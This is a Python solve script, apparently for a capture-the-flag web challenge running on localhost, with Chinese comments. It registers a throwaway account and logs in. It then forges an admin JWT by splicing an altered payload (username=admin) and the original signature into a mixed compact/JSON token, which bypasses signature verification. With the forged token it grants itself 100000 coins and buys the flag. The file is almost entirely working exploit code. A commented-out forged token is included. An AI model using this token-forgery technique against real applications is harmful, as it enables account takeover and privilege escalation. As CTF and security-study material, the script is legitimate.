import requests
import random
import string
from bs4 import BeautifulSoup
import re
from json import loads, dumps
from jwcrypto.common import base64url_decode, base64url_encode

def generate_random_credentials(length=8):
    username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    password = ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))
    return username, password

def refresh_token(token):
    claim="username=admin"
    [header, payload, signature] = token.split(".")
    parsed_payload = loads(base64url_decode(payload))

    try:
        claims =claim.split(",")
        for c in claims:
            key, value = c.split("=")
            parsed_payload[key.strip()] = value.strip()
    except:
        print("[-] Given claims are not in a valid format")
        exit(1)

    fake_payload = base64url_encode((dumps(parsed_payload, separators=(',', ':'))))
    new_payload = '{"  ' + header + '.' + fake_payload + '.":"","protected":"' + header + '", "payload":"' + payload + '","signature":"' + signature + '"}'
    return new_payload

def main():
    # base_url = input("请输入目标URL: ").strip()
    base_url = "http://localhost:9999"
    register_url = f"{base_url}/register"
    login_url = f"{base_url}/login"
    update_coins_url = f"{base_url}/admin/update_coins"
    buy_flag_url = f"{base_url}/buy_flag"

    session = requests.Session()

    # 1. 注册
    while True:
        username, password = generate_random_credentials()
        register_data = {'username': username, 'password': password}
        print(f"尝试注册用户: {username}")
        try:
            response = session.post(register_url, data=register_data, allow_redirects=False)
            if response.status_code == 302 and response.headers.get('Location') == '/login':
                print(f"注册成功: 用户名={username}, 密码={password}")
                break
            else:
                print("注册失败，将重试...")
        except requests.exceptions.RequestException as e:
            print(f"请求失败: {e}")
            return

    # 2. 登录
    login_data = {'username': username, 'password': password}
    try:
        response = session.post(login_url, data=login_data, allow_redirects=False)
        if 'token' in session.cookies:
            token = session.cookies.get('token')
            print("登录成功，获取到token.")
        else:
            print("登录失败，未获取到token.")
            return
    except requests.exceptions.RequestException as e:
        print(f"请求失败: {e}")
        return

    # 3. 刷新 Token (占位)
    new_token = refresh_token(token)
    # new_token="""{"eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3NTEyMTE3MzMwLCJpYXQiOjE3NTEyMDgxMzMsImp0aSI6IjNrRlFsMndZTXl2MWt1SXFBYTZPOUEiLCJuYmYiOjE3NTEyMDgxMzMsInVzZXJuYW1lIjoiYWRtaW4ifQ.":"","protected":"eyJhbGciOiJSUzUxMiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3NTEyMTE3MzMwLCJpYXQiOjE3NTEyMDgxMzMsImp0aSI6IjNrRlFsMndZTXl2MWt1SXFBYTZPOUEiLCJuYmYiOjE3NTEyMDgxMzMsInVzZXJuYW1lIjoibzEwbnQ4dzkifQ","signature":"KO7YYWVI7QIzVRG4AAJy6V0uEJpWeXh_BUvoUWWBoVvnRJp1yQ4GCuUMD83OGBQNG4y67OJzp1O93-uYOq2eIyqW6EQYObHkx1QwMykBc94e_R2kFjpumkTAZtZCTZrBwZKTLAxgqnTAnw85leGxoemKBmrcRBTXL4PVhIPyYehz17XoZ1t7-D2S3jP67J1aJQxfedPXnBiQJDggp1NabiADnqoMQKsoHGGy_WbsZQiexxdykOvhgmakHbBL9EXcYbcoczMQiMIZhEGC3hSwR6P5FbCyhShno_sjuwxSfZ5KPGAw6vgjSLyFIyJHKGNd3EOXDyxYErrpSBNjhg4hxw"}"""
    session.cookies.clear()
    session.cookies.set('token', new_token)
    print("Token已刷新")
    print("token："+new_token)
    # 4. 更新金币
    update_data = {'username': 'admin', 'coins': 100000}
    try:
        # proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
        response = session.post(update_coins_url, data=update_data, allow_redirects=False)
        # print("当前Session Cookies:", session.cookies.get_dict())
        if response.status_code == 302 and response.headers.get('Location') == '/admin':
            print(f"修改金币成功")
        else:
            print("修改金币失败")
        # 这里我们不检查响应，因为根据逻辑，只要cookie对了就能成功
        print("已发送更新金币请求.")
    except requests.exceptions.RequestException as e:
        print(f"更新金币请求失败: {e}")
        return

    # 5. 购买并获取 Flag
    try:
        response = session.get(buy_flag_url)
        if response.status_code == 200:
            soup = BeautifulSoup(response.text, 'html.parser')
            flag_tag = soup.find('p', class_='flag-value')
            if flag_tag:
                flag = flag_tag.text.strip()
                print(f"成功获取Flag: {flag}")
            else:
                # 尝试用正则从整个文本中匹配
                flag_match = re.search(r'flag{[^}]+}', response.text)
                if flag_match:
                    print(f"成功获取Flag: {flag_match.group(0)}")
                else:
                    print("购买flag成功，但在页面中未找到flag。")
                    # print("页面内容:", response.text)
        else:
            print(f"购买flag失败，状态码: {response.status_code}")
            # print("页面内容:", response.text)

    except requests.exceptions.RequestException as e:
        print(f"购买flag请求失败: {e}")

if __name__ == "__main__":
    main()